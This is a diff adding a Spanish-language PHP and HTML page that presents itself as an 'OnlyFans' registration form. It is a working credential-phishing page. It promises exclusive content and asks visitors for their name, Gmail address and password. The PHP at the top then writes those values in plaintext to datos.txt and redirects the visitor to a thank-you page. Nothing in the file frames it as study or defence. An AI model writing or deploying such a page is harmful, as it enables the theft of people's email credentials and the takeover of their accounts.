@@ -1,0 +1,62 @@
+<?php
+// Comprobar si el formulario ha sido enviado
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Obtener los datos del formulario
+    $name = $_POST['name'];
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+    
+    // Preparar los datos a guardar en el archivo
+    $data = "Nombre: $name\nCorreo: $email\nContraseña: $password\n\n";
+
+    // Guardar los datos en el archivo datos.txt
+    file_put_contents('datos.txt', $data, FILE_APPEND);
+
+    // Redirigir a una página de confirmación
+    header('Location: gracias.html');
+    exit();
+}
+?>
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario OnlyFans - Registro</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="scripts.js" defer></script>
+</head>
+<body>
+    <header>
+        <h1>Bienvenid@ a Mi Página de OnlyFans</h1>
+        <p>¡Accede a contenido exclusivo de forma segura y anónima!</p>
+    </header>
+
+    <main>
+        <!-- Sección de formulario obligatorio -->
+        <section id="auth">
+            <h2>Accede para ver contenido exclusivo</h2>
+            <p>Por favor, completa el formulario para proceder a la página de contenido exclusivo.</p>
+
+            <form action="index.php" method="POST">
+                <label for="name">Nombre:</label><br>
+                <input type="text" id="name" name="name" required><br>
+
+                <label for="email">Correo (Gmail):</label><br>
+                <input type="email" id="email" name="email" required><br>
+
+                <label for="password">Contraseña:</label><br>
+                <input type="password" id="password" name="password" required><br>
+
+                <input type="submit" value="Acceder">
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 Mi OnlyFans</p>
+        <p>Contenido exclusivo solo para mayores de 18 años. Accede bajo tu propio riesgo.</p>
+    </footer>
+</body>
+</html>
